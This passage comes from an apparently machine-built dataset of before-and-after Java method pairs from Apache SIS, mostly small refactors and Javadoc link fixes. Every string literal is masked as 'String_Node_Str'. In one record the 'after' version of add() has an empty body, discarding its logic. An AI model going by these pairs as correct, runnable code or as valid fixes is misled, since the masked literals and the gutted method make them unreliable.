  DefaultFeatureType city=city();
  city=new DefaultFeatureType(name(""String_Node_Str""),false,new DefaultFeatureType[]{city()},city.getProperty(""String_Node_Str""));
  assertPropertiesEquals(city,false);
  assertPropertiesEquals(city,true,""String_Node_Str"",""String_Node_Str"");
}"
91695,"/** 
 * Tests inclusion of a property of kind operation.
 */
@Test public void testOperationProperty(){
  final Map<String,String> featureName=singletonMap(DefaultFeatureType.NAME_KEY,""String_Node_Str"");
  final Map<String,String> identifierName=singletonMap(DefaultAttributeType.NAME_KEY,""String_Node_Str"");
  final DefaultFeatureType[] parent={city()};
  final DefaultFeatureType city=new DefaultFeatureType(featureName,false,parent,new LinkOperation(identifierName,parent[0].getProperty(""String_Node_Str"")));
  assertPropertiesEquals(city,true,""String_Node_Str"",""String_Node_Str"",""String_Node_Str"");
  final PropertyType parliament=new LinkOperation(identifierName,DefaultAttributeTypeTest.parliament());
  try {
    final DefaultFeatureType illegal=new DefaultFeatureType(featureName,false,parent,parliament);
    fail(""String_Node_Str"" + illegal);
  }
 catch (  IllegalArgumentException e) {
    final String message=e.getLocalizedMessage();
    assertTrue(message,message.contains(""String_Node_Str""));
    assertTrue(message,message.contains(""String_Node_Str""));
    assertTrue(message,message.contains(""String_Node_Str""));
  }
}","/** 
 * Tests inclusion of a property of kind operation.
 */
@Test public void testOperationProperty(){
  final Map<String,?> featureName=name(""String_Node_Str"");
  final Map<String,?> identifierName=name(""String_Node_Str"");
  final DefaultFeatureType[] parent={city()};
  final DefaultFeatureType city=new DefaultFeatureType(featureName,false,parent,new LinkOperation(identifierName,parent[0].getProperty(""String_Node_Str"")));
  assertPropertiesEquals(city,true,""String_Node_Str"",""String_Node_Str"",""String_Node_Str"");
  final PropertyType parliament=new LinkOperation(identifierName,DefaultAttributeTypeTest.parliament());
  try {
    final DefaultFeatureType illegal=new DefaultFeatureType(featureName,false,parent,parliament);
    fail(""String_Node_Str"" + illegal);
  }
 catch (  IllegalArgumentException e) {
    final String message=e.getLocalizedMessage();
    assertTrue(message,message.contains(""String_Node_Str""));
    assertTrue(message,message.contains(""String_Node_Str""));
    assertTrue(message,message.contains(""String_Node_Str""));
  }
}"
91696,"/** 
 * Tests the inheritance of 2 types having the same common parent.
 */
@Test @DependsOnMethod(""String_Node_Str"") public void testMultiInheritance(){
  final DefaultFeatureType metropolis=metropolis();
  final DefaultFeatureType capital=capital();
  final DefaultFeatureType metroCapital=new DefaultFeatureType(singletonMap(DefaultFeatureType.NAME_KEY,""String_Node_Str""),false,new DefaultFeatureType[]{metropolis,capital},new DefaultAttributeType<>(singletonMap(DefaultAttributeType.NAME_KEY,""String_Node_Str""),String.class,1,1,null));
  assertUnmodifiable(metroCapital);
  assertEquals(""String_Node_Str"",""String_Node_Str"",metroCapital.getName().toString());
  assertArrayEquals(""String_Node_Str"",new Object[]{metropolis,capital},metroCapital.getSuperTypes().toArray());
  assertFalse(""String_Node_Str"",metroCapital.isAbstract());
  assertFalse(""String_Node_Str"",metroCapital.isSparse());
  assertTrue(""String_Node_Str"",metroCapital.isSimple());
  assertEquals(""String_Node_Str"",6,metroCapital.indices().size());
  assertPropertiesEquals(metroCapital,false,""String_Node_Str"");
  assertPropertiesEquals(metroCapital,true,""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",CharSequence.class,((AttributeType<?>)metroCapital.getProperty(""String_Node_Str"")).getValueClass());
  assertTrue(""String_Node_Str"",DefaultFeatureType.maybeAssignableFrom(capital,metroCapital));
  assertFalse(""String_Node_Str"",DefaultFeatureType.maybeAssignableFrom(metroCapital,capital));
  assertTrue(""String_Node_Str"",DefaultFeatureType.maybeAssignableFrom(metropolis,metroCapital));
  assertFalse(""String_Node_Str"",DefaultFeatureType.maybeAssignableFrom(metroCapital,metropolis));
  assertTrue(""String_Node_Str"",capital.isAssignableFrom(metroCapital));
  assertFalse(""String_Node_Str"",metroCapital.isAssignableFrom(capital));
  assertTrue(""String_Node_Str"",metropolis.isAssignableFrom(metroCapital));
  assertFalse(""String_Node_Str"",metroCapital.isAssignableFrom(metropolis));
}","/** 
 * Tests the inheritance of 2 types having the same common parent.
 */
@Test @DependsOnMethod(""String_Node_Str"") public void testMultiInheritance(){
  final DefaultFeatureType metropolis=metropolis();
  final DefaultFeatureType capital=capital();
  final DefaultFeatureType metroCapital=new DefaultFeatureType(name(""String_Node_Str""),false,new DefaultFeatureType[]{metropolis,capital},new DefaultAttributeType<>(name(""String_Node_Str""),String.class,1,1,null));
  assertUnmodifiable(metroCapital);
  assertEquals(""String_Node_Str"",""String_Node_Str"",metroCapital.getName().toString());
  assertArrayEquals(""String_Node_Str"",new Object[]{metropolis,capital},metroCapital.getSuperTypes().toArray());
  assertFalse(""String_Node_Str"",metroCapital.isAbstract());
  assertFalse(""String_Node_Str"",metroCapital.isSparse());
  assertTrue(""String_Node_Str"",metroCapital.isSimple());
  assertEquals(""String_Node_Str"",6,metroCapital.indices().size());
  assertPropertiesEquals(metroCapital,false,""String_Node_Str"");
  assertPropertiesEquals(metroCapital,true,""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"",""String_Node_Str"");
  assertEquals(""String_Node_Str"",CharSequence.class,((AttributeType<?>)metroCapital.getProperty(""String_Node_Str"")).getValueClass());
  assertTrue(""String_Node_Str"",DefaultFeatureType.maybeAssignableFrom(capital,metroCapital));
  assertFalse(""String_Node_Str"",DefaultFeatureType.maybeAssignableFrom(metroCapital,capital));
  assertTrue(""String_Node_Str"",DefaultFeatureType.maybeAssignableFrom(metropolis,metroCapital));
  assertFalse(""String_Node_Str"",DefaultFeatureType.maybeAssignableFrom(metroCapital,metropolis));
  assertTrue(""String_Node_Str"",capital.isAssignableFrom(metroCapital));
  assertFalse(""String_Node_Str"",metroCapital.isAssignableFrom(capital));
  assertTrue(""String_Node_Str"",metropolis.isAssignableFrom(metroCapital));
  assertFalse(""String_Node_Str"",metroCapital.isAssignableFrom(metropolis));
}"
91697,"/** 
 * Ensures that we can not use two properties with the same name.
 */
@Test @DependsOnMethod(""String_Node_Str"") public void testNameCollision(){
  final DefaultAttributeType<String> city=new DefaultAttributeType<>(singletonMap(DefaultAttributeType.NAME_KEY,""String_Node_Str""),String.class,1,1,null);
  final DefaultAttributeType<Integer> cityId=new DefaultAttributeType<>(singletonMap(DefaultAttributeType.NAME_KEY,""String_Node_Str""),Integer.class,1,1,null);
  final DefaultAttributeType<Integer> population=new DefaultAttributeType<>(singletonMap(DefaultAttributeType.NAME_KEY,""String_Node_Str""),Integer.class,1,1,null);
  final Map<String,String> identification=singletonMap(DefaultAttributeType.NAME_KEY,""String_Node_Str"");
  try {
    final Object t=new DefaultFeatureType(identification,false,null,city,population,cityId);
    fail(""String_Node_Str"" + t);
  }
 catch (  IllegalArgumentException e) {
    final String message=e.getMessage();
    assertTrue(message,message.contains(""String_Node_Str""));
    assertTrue(message,message.contains(""String_Node_Str""));
  }
}","/** 
 * Ensures that we can not use two properties with the same name.
 */
@Test @DependsOnMethod(""String_Node_Str"") public void testNameCollision(){
  final DefaultAttributeType<String> city=new DefaultAttributeType<>(name(""String_Node_Str""),String.class,1,1,null);
  final DefaultAttributeType<Integer> cityId=new DefaultAttributeType<>(name(""String_Node_Str""),Integer.class,1,1,null);
  final DefaultAttributeType<Integer> population=new DefaultAttributeType<>(name(""String_Node_Str""),Integer.class,1,1,null);
  try {
    final Object t=new DefaultFeatureType(name(""String_Node_Str""),false,null,city,population,cityId);
    fail(""String_Node_Str"" + t);
  }
 catch (  IllegalArgumentException e) {
    final String message=e.getMessage();
    assertTrue(message,message.contains(""String_Node_Str""));
    assertTrue(message,message.contains(""String_Node_Str""));
  }
}"
91698,"/** 
 * Implementation of   {@link #testComplex()} for the given minimum and maximum occurrences.
 */
private static void testComplex(final DefaultAttributeType<String> city,final DefaultAttributeType<Integer> population,final int minimumOccurs,final int maximumOccurs){
  final DefaultAttributeType<String> festival=new DefaultAttributeType<>(singletonMap(DefaultAttributeType.NAME_KEY,""String_Node_Str""),String.class,minimumOccurs,maximumOccurs,null);
  final DefaultFeatureType complex=new DefaultFeatureType(singletonMap(DefaultAttributeType.NAME_KEY,""String_Node_Str""),false,null,city,population,festival);
  assertUnmodifiable(complex);
  final Collection<PropertyType> properties=complex.getProperties(false);
  final Iterator<PropertyType> it=properties.iterator();
  assertEquals(""String_Node_Str"",""String_Node_Str"",complex.getName().toString());
  assertTrue(""String_Node_Str"",complex.getSuperTypes().isEmpty());
  assertTrue(""String_Node_Str"",complex.isAssignableFrom(complex));
  assertFalse(""String_Node_Str"",complex.isAbstract());
  assertFalse(""String_Node_Str"",complex.isSparse());
  assertEquals(""String_Node_Str"",maximumOccurs == minimumOccurs,complex.isSimple());
  assertEquals(""String_Node_Str"",maximumOccurs == 0 ? 2 : 3,complex.indices().size());
  assertEquals(""String_Node_Str"",minimumOccurs,festival.getMinimumOccurs());
  assertEquals(""String_Node_Str"",maximumOccurs,festival.getMaximumOccurs());
  assertEquals(""String_Node_Str"",3,properties.size());
  assertSame(""String_Node_Str"",city,it.next());
  assertSame(""String_Node_Str"",population,it.next());
  assertSame(""String_Node_Str"",festival,it.next());
  assertFalse(it.hasNext());
}","/** 
 * Implementation of   {@link #testComplex()} for the given minimum and maximum occurrences.
 */
private static void testComplex(final DefaultAttributeType<String> city,final DefaultAttributeType<Integer> population,final int minimumOccurs,final int maximumOccurs){
  final DefaultAttributeType<String> festival=new DefaultAttributeType<>(name(""String_Node_Str""),String.class,minimumOccurs,maximumOccurs,null);
  final DefaultFeatureType complex=new DefaultFeatureType(name(""String_Node_Str""),false,null,city,population,festival);
  assertUnmodifiable(complex);
  final Collection<PropertyType> properties=complex.getProperties(false);
  final Iterator<PropertyType> it=properties.iterator();
  assertEquals(""String_Node_Str"",""String_Node_Str"",complex.getName().toString());
  assertTrue(""String_Node_Str"",complex.getSuperTypes().isEmpty());
  assertTrue(""String_Node_Str"",complex.isAssignableFrom(complex));
  assertFalse(""String_Node_Str"",complex.isAbstract());
  assertFalse(""String_Node_Str"",complex.isSparse());
  assertEquals(""String_Node_Str"",maximumOccurs == minimumOccurs,complex.isSimple());
  assertEquals(""String_Node_Str"",maximumOccurs == 0 ? 2 : 3,complex.indices().size());
  assertEquals(""String_Node_Str"",minimumOccurs,festival.getMinimumOccurs());
  assertEquals(""String_Node_Str"",maximumOccurs,festival.getMaximumOccurs());
  assertEquals(""String_Node_Str"",3,properties.size());
  assertSame(""String_Node_Str"",city,it.next());
  assertSame(""String_Node_Str"",population,it.next());
  assertSame(""String_Node_Str"",festival,it.next());
  assertFalse(it.hasNext());
}"
91699,"/** 
 * Adds a value for the given name if none exist. If a previous value already exists for the given name, then an exception is thrown.
 * @param store  the data store for which to add a value, or {@code null} if unknown.
 * @param name   the name for which to add a value.
 * @param value  the value to add (can not be null).
 * @throws IllegalNameException if another element is already registered for the given name.
 */
public void add(final DataStore store,GenericName name,final E value) throws IllegalNameException {
  ArgumentChecks.ensureNonNull(""String_Node_Str"",name);
  ArgumentChecks.ensureNonNull(""String_Node_Str"",value);
  final String key=name.toString();
  if (values.putIfAbsent(key,value) != null) {
    throw new IllegalNameException(locale(store),Resources.Keys.FeatureAlreadyPresent_2,name(store),key);
  }
  while (name instanceof ScopedName) {
    name=((ScopedName)name).tail();
    final String alias=name.toString();
    if (CollectionsExt.addToMultiValuesMap(aliases,alias,key).size() > 1) {
      values.remove(alias);
    }
 else     if (values.put(alias,value) != null) {
      throw new ConcurrentModificationException(name(store).toString());
    }
  }
}","/** 
 * Adds a value for the given name if none exist. If a previous value already exists for the given name, then an exception is thrown.
 * @param store  the data store for which to add a value, or {@code null} if unknown.
 * @param name   the name for which to add a value.
 * @param value  the value to add (can not be null).
 * @throws IllegalNameException if another element is already registered for the given name.
 */
public void add(final DataStore store,GenericName name,final E value) throws IllegalNameException {
}"
91700,"/** 
 * Constructs an operation from the given properties. The identification map is given unchanged to the   {@linkplain AbstractIdentifiedType#AbstractIdentifiedType(Map) super-class constructor}. The following table is a reminder of main (not all) recognized map entries: <table class=""sis""> <caption>Recognized map entries (non exhaustive list)</caption> <tr> <th>Map key</th> <th>Value type</th> <th>Returned by</th> </tr> <tr> <td>  {@value org.apache.sis.feature.AbstractIdentifiedType#NAME_KEY}</td> <td>  {@link GenericName} or {@link String}</td> <td>  {@link #getName()}</td> </tr> <tr> <td>  {@value org.apache.sis.feature.AbstractIdentifiedType#DEFINITION_KEY}</td> <td>  {@link InternationalString} or {@link String}</td> <td>  {@link #getDefinition()}</td> </tr> <tr> <td>  {@value org.apache.sis.feature.AbstractIdentifiedType#DESIGNATION_KEY}</td> <td>  {@link InternationalString} or {@link String}</td> <td>  {@link #getDesignation()}</td> </tr> <tr> <td>  {@value org.apache.sis.feature.AbstractIdentifiedType#DESCRIPTION_KEY}</td> <td>  {@link InternationalString} or {@link String}</td> <td>  {@link #getDescription()}</td> </tr> <tr> <td>  {@value org.apache.sis.feature.AbstractIdentifiedType#DEPRECATED_KEY}</td> <td>  {@link Boolean}</td> <td>  {@link #isDeprecated()}</td> </tr> </table>
 * @param identification  the name and other information to be given to this operation.
 */
public AbstractOperation(final Map<String,?> identification){
  super(identification);
}","/** 
 * Constructs an operation from the given properties. The identification map is given unchanged to the   {@linkplain AbstractIdentifiedType#AbstractIdentifiedType(Map) super-class constructor}. The following table is a reminder of main (not all) recognized map entries: <table class=""sis""> <caption>Recognized map entries (non exhaustive list)</caption> <tr> <th>Map key</th> <th>Value type</th> <th>Returned by</th> </tr> <tr> <td>  {@value org.apache.sis.feature.AbstractIdentifiedType#NAME_KEY}</td> <td>  {@link GenericName} or {@link String}</td> <td>  {@link #getName()}</td> </tr> <tr> <td>  {@value org.apache.sis.feature.AbstractIdentifiedType#DEFINITION_KEY}</td> <td>  {@link org.opengis.util.InternationalString} or {@link String}</td> <td>  {@link #getDefinition()}</td> </tr> <tr> <td>  {@value org.apache.sis.feature.AbstractIdentifiedType#DESIGNATION_KEY}</td> <td>  {@link org.opengis.util.InternationalString} or {@link String}</td> <td>  {@link #getDesignation()}</td> </tr> <tr> <td>  {@value org.apache.sis.feature.AbstractIdentifiedType#DESCRIPTION_KEY}</td> <td>  {@link org.opengis.util.InternationalString} or {@link String}</td> <td>  {@link #getDescription()}</td> </tr> <tr> <td>  {@value org.apache.sis.feature.AbstractIdentifiedType#DEPRECATED_KEY}</td> <td>  {@link Boolean}</td> <td>  {@link #isDeprecated()}</td> </tr> </table>
 * @param identification  the name and other information to be given to this operation.
 */
public AbstractOperation(final Map<String,?> identification){
  super(identification);
}"
91701,"/** 
 * Executes the operation on the specified feature with the specified parameters. The value returned by this method depends on the value returned by   {@link #getResult()}: <ul> <li>If   {@code getResult()} returns {@code null}, then this method should return   {@code null}.</li> <li>If   {@code getResult()} returns an instance of {@link AttributeType}, then this method shall return an instance of   {@link Attribute}and the   {@code Attribute.getType() == getResult()} relation should hold.</li><li>If  {@code getResult()} returns an instance of {@link FeatureAssociationRole}, then this method shall return an instance of   {@link FeatureAssociation}and the   {@code FeatureAssociation.getRole() == getResult()} relation should hold.</li></ul> <div class=""note""><b>Analogy:</b> if we compare  {@code Operation} to {@link Method} in the Java language, then this method is equivalentto  {@link Method#apply(Object,Object)}. The   {@code Feature} argument is equivalent to {@code this}in the Java language, and may be   {@code null} if the operation does not need a feature instance(like static methods in the Java language).</div>
 * @param feature     the feature on which to execute the operation.Can be  {@code null} if the operation does not need feature instance.
 * @param parameters  the parameters to use for executing the operation.Can be  {@code null} if the operation does not take any parameters.
 * @return the operation result, or {@code null} if this operation does not produce any result.
 * @throws FeatureOperationException if the operation execution can not complete.
 */
@Override public abstract Property apply(Feature feature,ParameterValueGroup parameters) throws FeatureOperationException ;","/** 
 * Executes the operation on the specified feature with the specified parameters. The value returned by this method depends on the value returned by   {@link #getResult()}: <ul> <li>If   {@code getResult()} returns {@code null}, then this method should return   {@code null}.</li> <li>If   {@code getResult()} returns an instance of {@link AttributeType}, then this method shall return an instance of   {@link Attribute}and the   {@code Attribute.getType() == getResult()} relation should hold.</li><li>If  {@code getResult()} returns an instance of {@link org.opengis.feature.FeatureAssociationRole}, then this method shall return an instance of   {@link FeatureAssociation}and the   {@code FeatureAssociation.getRole() == getResult()} relation should hold.</li></ul> <div class=""note""><b>Analogy:</b> if we compare  {@code Operation} to {@link java.lang.reflect.Method} in the Java language, then this method is equivalentto  {@link java.lang.reflect.Method#invoke(Object,Object)}. The   {@code Feature} argument is equivalent to {@code this}in the Java language, and may be   {@code null} if the operation does not need a feature instance(like static methods in the Java language).</div>
 * @param feature     the feature on which to execute the operation.Can be  {@code null} if the operation does not need feature instance.
 * @param parameters  the parameters to use for executing the operation.Can be  {@code null} if the operation does not take any parameters.
 * @return the operation result, or {@code null} if this operation does not produce any result.
 * @throws FeatureOperationException if the operation execution can not complete.
 */
@Override public abstract Property apply(Feature feature,ParameterValueGroup parameters) throws FeatureOperationException ;"
91702,"/** 
 * Returns the name of the type of values that the given property can take. The type of value can be a   {@link Class}, a   {@link FeatureType} or another {@code PropertyType}depending on given argument: <ul> <li>If   {@code property} is an {@link AttributeType}, then this method gets the  {@linkplain DefaultAttributeType#getValueClass() value class} and{@linkplain DefaultNameFactory#toTypeName(Class) maps that class to a name}.</li> <li>If   {@code property} is a {@link FeatureAssociationRole}, then this method gets the name of the   {@linkplain DefaultAssociationRole#getValueType() value type}. This methods can work even if the associated   {@code FeatureType} is not yet resolved.</li><li>If  {@code property} is an {@link Operation}, then this method returns the name of the  {@linkplain AbstractOperation#getResult() result type}.</li> </ul>
 * @param property  the property for which to get the name of value type.
 * @return the name of value type, or {@code null} if none.
 * @since 0.8
 */
public static GenericName getValueTypeName(final PropertyType property){
  if (property instanceof FeatureAssociationRole) {
    return DefaultAssociationRole.getValueTypeName((FeatureAssociationRole)property);
  }
 else   if (property instanceof AttributeType<?>) {
    final DefaultNameFactory factory=DefaultFactories.forBuildin(NameFactory.class,DefaultNameFactory.class);
    return factory.toTypeName(((AttributeType<?>)property).getValueClass());
  }
 else   if (property instanceof Operation) {
    final IdentifiedType result=((Operation)property).getResult();
    if (result != null) {
      return result.getName();
    }
  }
  return null;
}","/** 
 * Returns the name of the type of values that the given property can take. The type of value can be a   {@link Class}, a   {@link org.opengis.feature.FeatureType}or another   {@code PropertyType} depending on given argument:<ul> <li>If  {@code property} is an {@link AttributeType}, then this method gets the  {@linkplain DefaultAttributeType#getValueClass() value class} and{@linkplain DefaultNameFactory#toTypeName(Class) maps that class to a name}.</li> <li>If   {@code property} is a {@link FeatureAssociationRole}, then this method gets the name of the   {@linkplain DefaultAssociationRole#getValueType() value type}. This methods can work even if the associated   {@code FeatureType} is not yet resolved.</li><li>If  {@code property} is an {@link Operation}, then this method returns the name of the  {@linkplain AbstractOperation#getResult() result type}.</li> </ul>
 * @param property  the property for which to get the name of value type.
 * @return the name of value type, or {@code null} if none.
 * @since 0.8
 */
public static GenericName getValueTypeName(final PropertyType property){
  if (property instanceof FeatureAssociationRole) {
    return DefaultAssociationRole.getValueTypeName((FeatureAssociationRole)property);
  }
 else   if (property instanceof AttributeType<?>) {
    final DefaultNameFactory factory=DefaultFactories.forBuildin(NameFactory.class,DefaultNameFactory.class);
    return factory.toTypeName(((AttributeType<?>)property).getValueClass());
  }
 else   if (property instanceof Operation) {
    final IdentifiedType result=((Operation)property).getResult();
    if (result != null) {
      return result.getName();
    }
  }
  return null;
}"
91703,"/** 
 * Tests   {@link DefaultOperation#toString()}.
 */
@Test public void testToString(){
  assertEquals(""String_Node_Str"",foundCity().toString());
}","/** 
 * Tests   {@link AbstractOperation#toString()}.
 */
@Test public void testToString(){
  assertEquals(""String_Node_Str"",foundCity().toString());
}"
91704,"/** 
 * Tests serialization of   {@link DefaultOperation}.
 */
@Test public void testSerialization(){
  assertSerializedEquals(foundCity());
}","/** 
 * Tests serialization of   {@link AbstractOperation}.
 */
@Test public void testSerialization(){
  assertSerializedEquals(foundCity());
}"
91705,"/** 
 * Fix the spelling of words that changed between ISO 19115:2003 and ISO 19115:2014, then wraps the value into an adapter. <p>The spelling of ""license"" was changed to ""licence"" in latest standard, but XML marshalling shall use the previous spelling until XML schema are updated.</p>
 * @param value  the value version of {@link CodeList}, to be marshalled.
 * @return the wrapper for the code list value.
 */
@Override protected MD_RestrictionCode wrap(final CodeListUID value){
  if (""String_Node_Str"".equals(value.codeListValue)) {
    value.codeListValue=""String_Node_Str"";
  }
  return new MD_RestrictionCode(value);
}","/** 
 * Fix the spelling of words that changed between ISO 19115:2003 and ISO 19115:2014, then wraps the value into an adapter. <p>The spelling of ""license"" was changed to ""licence"" in latest standard, but XML marshalling shall use the previous spelling until XML schema are updated.</p>
 * @param value  the value version of {@link org.opengis.util.CodeList}, to be marshalled.
 * @return the wrapper for the code list value.
 */
@Override protected MD_RestrictionCode wrap(final CodeListUID value){
  if (""String_Node_Str"".equals(value.codeListValue)) {
    value.codeListValue=""String_Node_Str"";
  }
  return new MD_RestrictionCode(value);
}"
91706,"/** 
 * Returns information about the Apache SIS configuration to be reported in   {@link org.apache.sis.setup.About}. This method is invoked only for aspects that depends on other modules than   {@code sis-utility}. <p>Current keys are:</p> <ul> <li>  {@code ""EPSG""}: version of EPSG database.</li> </ul>
 * @param key     a key identifying the information to return.
 * @param locale  language to use if possible.
 * @return the information, or {@code null} if none.
 * @see org.apache.sis.internal.util.MetadataServices#getInformation(String)
 * @since 0.7
 */
public String getInformation(String key,Locale locale){
  return null;
}","/** 
 * Returns information about the Apache SIS configuration to be reported in   {@link org.apache.sis.setup.About}. This method is invoked only for aspects that depends on other modules than   {@code sis-utility}. <p>Current keys are:</p> <ul> <li>  {@code ""EPSG""}: version of EPSG database.</li> </ul>
 * @param key     a key identifying the information to return.
 * @param locale  language to use if possible.
 * @return the information, or {@code null} if none.
 * @see org.apache.sis.internal.util.MetadataServices#getInformation(String,Locale)
 * @since 0.7
 */
public String getInformation(String key,Locale locale){
  return null;
}"
91707,"/** 
 * For subclass only. This constructor registers this instance as a   {@link SystemListener}in order to force a new   {@code ReferencingServices} lookup if the classpath changes.
 */
protected ReferencingServices(){
  super(Modules.METADATA,""String_Node_Str"");
}","/** 
 * For subclass only. This constructor registers this instance as a  {@link org.apache.sis.internal.system.SystemListener} in order toforce a new  {@code ReferencingServices} lookup if the classpath changes.
 */
protected ReferencingServices(){
  super(Modules.METADATA,""String_Node_Str"");
}"
91708,"/** 
 * Executes the given SQL statement. This method performs the following choices: <ul> <li>If   {@link #isSupported(StringBuilder)} returns {@code false}, then this method does nothing.</li> <li>If the   {@code maxRowsPerInsert} argument given at construction time was zero,then this method skips  {@code ""INSERT INTO""} statements but executes all other.</li><li>Otherwise this method executes the given statement with the following modification: if the statement is an  {@code ""INSERT INTO""} with many values, then this method may breakthat statement into many  {@code ""INSERT INTO""} where each statements does not have movethan  {@code maxRowsPerInsert} rows.</li></ul> Subclasses that override this method can freely edit the  {@link StringBuilder} content beforeto invoke this method.
 * @param sql  the SQL statement to execute.
 * @return the number of rows added or modified as a result of the statement execution.
 * @throws SQLException if an error occurred while executing the SQL statement.
 * @throws IOException if an I/O operation was required and failed.
 */
protected int execute(final StringBuilder sql) throws SQLException, IOException {
  if (!isSupported(sql)) {
    return 0;
  }
  String subSQL=currentSQL=CharSequences.trimWhitespaces(sql).toString();
  int count=0;
  if (subSQL.startsWith(""String_Node_Str"")) {
    statement.executeQuery(subSQL).close();
  }
 else {
    if (maxRowsPerInsert != Integer.MAX_VALUE && subSQL.startsWith(""String_Node_Str"")) {
      if (maxRowsPerInsert == 0) {
        subSQL=null;
      }
 else {
        int endOfLine=subSQL.indexOf('\n',11);
        if (subSQL.regionMatches(endOfLine - 6,""String_Node_Str"",0,6)) {
          sql.setLength(0);
          final int startOfValues=sql.append(subSQL,0,endOfLine).append(' ').length();
          int nrows=maxRowsPerInsert;
          int begin=endOfLine + 1;
          while ((endOfLine=subSQL.indexOf('\n',++endOfLine)) >= 0) {
            if (--nrows == 0) {
              int end=endOfLine;
              if (subSQL.charAt(end - 1) == ',') {
                end--;
              }
              count+=statement.executeUpdate(currentSQL=sql.append(subSQL,begin,end).toString());
              sql.setLength(startOfValues);
              nrows=maxRowsPerInsert;
              begin=endOfLine + 1;
            }
          }
          int end=CharSequences.skipTrailingWhitespaces(subSQL,begin,subSQL.length());
          currentSQL=subSQL=(end > begin) ? sql.append(subSQL,begin,end).toString() : null;
        }
      }
    }
    if (subSQL != null) {
      count+=statement.executeUpdate(subSQL);
    }
  }
  currentSQL=null;
  return count;
}","/** 
 * Executes the given SQL statement. This method performs the following choices: <ul> <li>If   {@link #isSupported(CharSequence)} returns {@code false}, then this method does nothing.</li> <li>If the   {@code maxRowsPerInsert} argument given at construction time was zero,then this method skips  {@code ""INSERT INTO""} statements but executes all other.</li><li>Otherwise this method executes the given statement with the following modification: if the statement is an  {@code ""INSERT INTO""} with many values, then this method may breakthat statement into many  {@code ""INSERT INTO""} where each statements does not have movethan  {@code maxRowsPerInsert} rows.</li></ul> Subclasses that override this method can freely edit the  {@link StringBuilder} content beforeto invoke this method.
 * @param sql  the SQL statement to execute.
 * @return the number of rows added or modified as a result of the statement execution.
 * @throws SQLException if an error occurred while executing the SQL statement.
 * @throws IOException if an I/O operation was required and failed.
 */
protected int execute(final StringBuilder sql) throws SQLException, IOException {
  if (!isSupported(sql)) {
    return 0;
  }
  String subSQL=currentSQL=CharSequences.trimWhitespaces(sql).toString();
  int count=0;
  if (subSQL.startsWith(""String_Node_Str"")) {
    statement.executeQuery(subSQL).close();
  }
 else {
    if (maxRowsPerInsert != Integer.MAX_VALUE && subSQL.startsWith(""String_Node_Str"")) {
      if (maxRowsPerInsert == 0) {
        subSQL=null;
      }
 else {
        int endOfLine=subSQL.indexOf('\n',11);
        if (subSQL.regionMatches(endOfLine - 6,""String_Node_Str"",0,6)) {
          sql.setLength(0);
          final int startOfValues=sql.append(subSQL,0,endOfLine).append(' ').length();
          int nrows=maxRowsPerInsert;
          int begin=endOfLine + 1;
          while ((endOfLine=subSQL.indexOf('\n',++endOfLine)) >= 0) {
            if (--nrows == 0) {
              int end=endOfLine;
              if (subSQL.charAt(end - 1) == ',') {
                end--;
              }
              count+=statement.executeUpdate(currentSQL=sql.append(subSQL,begin,end).toString());
              sql.setLength(startOfValues);
              nrows=maxRowsPerInsert;
              begin=endOfLine + 1;
            }
          }
          int end=CharSequences.skipTrailingWhitespaces(subSQL,begin,subSQL.length());
          currentSQL=subSQL=(end > begin) ? sql.append(subSQL,begin,end).toString() : null;
        }
      }
    }
    if (subSQL != null) {
      count+=statement.executeUpdate(subSQL);
    }
  }
  currentSQL=null;
  return count;
}"
91709,"/** 
 * Declares this metadata and all its properties as unmodifiable. Any attempt to modify a property after this method call will throw an   {@link UnmodifiableMetadataException}. If this metadata is already unmodifiable, then this method does nothing. <p>Subclasses usually do not need to override this method since the default implementation performs most of its work using Java reflection.</p>
 */
@Override public void freeze(){
  if (isModifiable()) {
    final Collection<Identifier> p=identifiers;
    super.freeze();
    if (p == identifiers) {
      identifiers=CollectionsExt.unmodifiableOrCopy(p);
    }
  }
}","/** 
 * Declares this metadata and all its properties as unmodifiable. Any attempt to modify a property after this method call will throw an   {@link org.apache.sis.metadata.UnmodifiableMetadataException}. If this metadata is already unmodifiable, then this method does nothing. <p>Subclasses usually do not need to override this method since the default implementation performs most of its work using Java reflection.</p>
 */
@Override public void freeze(){
  if (isModifiable()) {
    final Collection<Identifier> p=identifiers;
    super.freeze();
    if (p == identifiers) {
      identifiers=CollectionsExt.unmodifiableOrCopy(p);
    }
  }
}"
91710,"/** 
 * Tests the   {@link VerticalDatumTypes#toLegacy(int)} method.
 */
@Test public void testToLegacy(){
  assertEquals(2002,VerticalDatumTypes.toLegacy(VerticalDatumTypes.ELLIPSOIDAL));
  assertEquals(2005,VerticalDatumTypes.toLegacy(VerticalDatumType.GEOIDAL));
  assertEquals(2006,VerticalDatumTypes.toLegacy(VerticalDatumType.DEPTH));
}","/** 
 * Tests the   {@link VerticalDatumTypes#toLegacy(VerticalDatumType)} method.
 */
@Test public void testToLegacy(){
  assertEquals(2002,VerticalDatumTypes.toLegacy(VerticalDatumTypes.ELLIPSOIDAL));
  assertEquals(2005,VerticalDatumTypes.toLegacy(VerticalDatumType.GEOIDAL));
  assertEquals(2006,VerticalDatumTypes.toLegacy(VerticalDatumType.DEPTH));
}"
91711,"/** 
 * Verifies the regular expressions used by the script runner. This method tests the values returned by   {@link ScriptRunner#isSupported(StringBuilder)}
 * @param sr  the script runner to use for testing regular expressions.
 */
@TestStep public static void testRegularExpressions(final ScriptRunner sr){
  assertFalse(sr.isSupported(""String_Node_Str""));
  assertFalse(sr.isSupported(""String_Node_Str""));
  assertTrue(sr.isSupported(""String_Node_Str""));
  assertFalse(sr.isSupported(""String_Node_Str""));
  assertFalse(sr.isSupported(""String_Node_Str""));
  assertFalse(sr.isSupported(""String_Node_Str""));
}","/** 
 * Verifies the regular expressions used by the script runner. This method tests the values returned by   {@link ScriptRunner#isSupported(CharSequence)}
 * @param sr  the script runner to use for testing regular expressions.
 */
@TestStep public static void testRegularExpressions(final ScriptRunner sr){
  assertFalse(sr.isSupported(""String_Node_Str""));
  assertFalse(sr.isSupported(""String_Node_Str""));
  assertTrue(sr.isSupported(""String_Node_Str""));
  assertFalse(sr.isSupported(""String_Node_Str""));
  assertFalse(sr.isSupported(""String_Node_Str""));
  assertFalse(sr.isSupported(""String_Node_Str""));
}"
91712,"/** 
 * Tests   {@link Element#pullElement(String)}. This implies testing   {@code Element} nesting.
 * @throws ParseException if an error occurred during the parsing.
 */
